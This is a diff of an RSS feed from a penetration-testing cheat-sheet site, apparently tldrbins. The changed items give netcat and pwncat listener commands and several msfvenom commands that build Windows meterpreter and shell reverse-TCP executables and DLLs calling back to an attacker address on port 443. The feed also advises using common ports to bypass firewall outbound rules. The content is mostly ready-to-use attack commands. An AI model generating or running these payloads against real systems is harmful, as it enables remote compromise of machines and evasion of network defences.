@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/listeners/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/listeners/</guid>
-      <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 #After getting a connection (local) back </description>
+      <description> nc rlwrap nc -lvnp 1337 pwncat Download pwncat&#xA;pwncat-cs -lp 1337 #After getting a connection (local) pwncat$ back </description>
     </item>
     <item>
       <title>Metasploit Listener</title>
@@ -26,7 +26,7 @@
       <link>https://tldrbins.github.io/metasploit_shellcode/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/metasploit_shellcode/</guid>
-      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note 1: These will be flagged by AV Note 2: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
+      <description>Generate Metasploit Shellcode Windows x64 EXE msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe Windows x86 EXE # Staged msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.exe # Stageless msfvenom -p windows/shell_reverse_tcp -a x86 -f exe --platform windows LHOST=10.10.14.10 LPORT=443 EXITFUNC=thread &amp;gt; rev.exe Windows x64 DLL msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 -f dll --platform windows LHOST=10.10.14.10 LPORT=443 &amp;gt; rev.dll Note: These will be flagged by AV Note: Try to use common ports such as 53, 80, 443 to bypass firewall outbound rules</description>
     </item>
   </channel>
 </rss>
